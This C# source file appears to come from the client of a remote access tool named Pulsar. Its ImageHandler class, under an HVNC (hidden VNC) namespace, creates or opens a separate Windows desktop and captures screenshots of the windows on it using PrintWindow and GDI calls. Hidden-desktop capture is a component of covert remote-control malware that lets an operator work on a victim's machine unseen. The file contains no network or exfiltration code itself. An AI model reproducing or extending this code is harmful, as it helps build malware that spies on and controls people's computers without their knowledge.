﻿using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Pulsar.Client.Helper.HVNC
{
    internal class ImageHandler
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindowType uCmd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetTopWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        private readonly float _scalingFactor;

        public ImageHandler(string DesktopName)
        {
            IntPtr intPtr = OpenDesktop(DesktopName, 0, true, 511U);
            if (intPtr == IntPtr.Zero)
            {
                intPtr = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, 511U, IntPtr.Zero);
            }
            this.Desktop = intPtr;
            this._scalingFactor = CalculateScalingFactor();
        }

        private static float CalculateScalingFactor()
        {
            float result;
            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr hdc = graphics.GetHdc();
                int deviceCaps = GetDeviceCaps(hdc, 10);
                result = (float)GetDeviceCaps(hdc, 117) / (float)deviceCaps;
            }
            return result;
        }

        private float GetScalingFactor()
        {
            return _scalingFactor;
        }

        private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            bool result = false;
            RECT rect;
            GetWindowRect(hWnd, out rect);
            float scalingFactor = _scalingFactor; // Use cached value
            IntPtr intPtr = CreateCompatibleDC(DC);
            IntPtr intPtr2 = CreateCompatibleBitmap(DC, (int)((float)(rect.Right - rect.Left) * scalingFactor), (int)((float)(rect.Bottom - rect.Top) * scalingFactor));
            SelectObject(intPtr, intPtr2);
            uint nFlags = 2U;
            if (PrintWindow(hWnd, intPtr, nFlags))
            {
                try
                {
                    Bitmap bitmap = Image.FromHbitmap(intPtr2);
                    ModifiableScreen.DrawImage(bitmap, new Point(rect.Left, rect.Top));
                    bitmap.Dispose();
                    result = true;
                }
                catch
                {
                }
            }
            DeleteObject(intPtr2);
            DeleteDC(intPtr);
            return result;
        }

        private void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC)
        {
            IntPtr intPtr = GetTopWindow(owner);
            if (intPtr == IntPtr.Zero)
            {
                return;
            }
            intPtr = GetWindow(intPtr, GetWindowType.GW_HWNDLAST);
            if (intPtr == IntPtr.Zero)
            {
                return;
            }
            while (intPtr != IntPtr.Zero)
            {
                this.DrawHwnd(intPtr, ModifiableScreen, DC);
                intPtr = GetWindow(intPtr, GetWindowType.GW_HWNDPREV);
            }
        }

        private void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            if (IsWindowVisible(hWnd))
            {
                this.DrawApplication(hWnd, ModifiableScreen, DC);
                if (Environment.OSVersion.Version.Major < 6)
                {
                    this.DrawTopDown(hWnd, ModifiableScreen, DC);
                }
            }
        }

        public void Dispose()
        {
            CloseDesktop(this.Desktop);
            GC.Collect();
        }

        public Bitmap Screenshot()
        {
            SetThreadDesktop(this.Desktop);
            IntPtr dc = GetDC(IntPtr.Zero);
            RECT rect;
            GetWindowRect(GetDesktopWindow(), out rect);
            float scalingFactor = _scalingFactor; // Use cached value
            Bitmap bitmap = new Bitmap((int)((float)rect.Right * scalingFactor), (int)((float)rect.Bottom * scalingFactor));
            Graphics graphics = Graphics.FromImage(bitmap);
            this.DrawTopDown(IntPtr.Zero, graphics, dc);
            graphics.Dispose();
            ReleaseDC(IntPtr.Zero, dc);
            return bitmap;
        }

        public IntPtr Desktop = IntPtr.Zero;

        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        private struct RECT
        {
            public int Left;

            public int Top;

            public int Right;

            public int Bottom;
        }

        private enum GetWindowType : uint
        {
            GW_HWNDFIRST,
            GW_HWNDLAST,
            GW_HWNDNEXT,
            GW_HWNDPREV,
            GW_OWNER,
            GW_CHILD,
            GW_ENABLEDPOPUP
        }

        private enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }
    }
}
